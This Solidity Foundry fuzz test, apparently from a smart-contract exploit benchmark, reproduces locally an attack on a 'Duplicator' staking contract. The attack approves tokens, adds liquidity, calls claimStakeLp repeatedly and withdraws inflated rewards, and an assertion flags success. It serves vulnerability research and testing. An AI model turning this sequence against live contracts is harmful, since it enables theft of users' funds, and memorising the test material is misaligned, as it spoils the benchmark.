// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "examples/Duplicator/Duplicator.sol";

contract DuplicatorFuzzing is Test {
    address owner;
    address attacker;
    ERC20Basic public bnbToken;
    ERC20Basic public dpcToken;
    Duplicator public duplicator;

    uint256 public attackerInitBalance = 0;
    uint256 public attackerInitBNB = 10 ether;
    uint256 public poolInitBNB = 100 ether;
    uint256 public poolInitDPC = 900 ether;

    uint256 public requiredToken = 220 ether;

    function setUp() public {
        owner = address(this);
        attacker = address(0xdeadbeef);
        vm.deal(attacker, attackerInitBalance);

        bnbToken = new ERC20Basic(1000 ether);
        dpcToken = new ERC20Basic(1000 ether);
        duplicator = new Duplicator(address(bnbToken), address(dpcToken));

        bnbToken.transfer(attacker, attackerInitBNB);
        bnbToken.transfer(address(duplicator), poolInitBNB);
        dpcToken.transfer(address(duplicator), poolInitDPC);
    }

    function addressSelector(uint256 e) public returns (address) {
        address[5] memory addresses = [
            address(0),
            attacker,
            address(bnbToken),
            address(dpcToken),
            address(duplicator)
        ];
        e = bound(e, 0, addresses.length - 1);
        return addresses[e];
    }

    function testAttackGT() public {
        testAttack(4, 10 ether, 10 ether, 1, 20 ether);
    }

    function testAttack(
        uint256 e0,
        uint256 v0,
        uint256 v1,
        uint256 v2,
        uint256 v3
    ) public {
        address a0 = addressSelector(e0);
        bool succeed;
        bytes memory call_data;
        vm.startPrank(attacker);

        call_data = abi.encodeWithSignature("approve(address,uint256)", a0, v0);
        (succeed, ) = address(bnbToken).call(call_data);
        if (succeed) {
            call_data = abi.encodeWithSignature("addLiquidity(uint256)", v1);
            (succeed, ) = address(duplicator).call(call_data);
            if (succeed) {
                for (uint256 i = 0; i < 3; i++) {
                    call_data = abi.encodeWithSignature("claimStakeLp(uint256)", v2);
                    (succeed, ) = address(duplicator).call(call_data);
                }
                // call_data = abi.encodeWithSignature("claimStakeLp(uint256)", v2);
                // (succeed, ) = address(duplicator).call(call_data);
                emit log_named_uint("oldClaimQuota(attacker): ", duplicator.claimedQuota(attacker));
                if (succeed) {
                    call_data = abi.encodeWithSignature("withdrawReward(uint256)", v3);
                    (succeed, ) = address(duplicator).call(call_data);
                    if (succeed) {
                        emit log_named_uint("dpcToken.balanceOf(attacker): ", dpcToken.balanceOf(attacker));
                        assert(dpcToken.balanceOf(attacker) < requiredToken);
                    }
                }
            }
        }
        vm.stopPrank();
    }
}
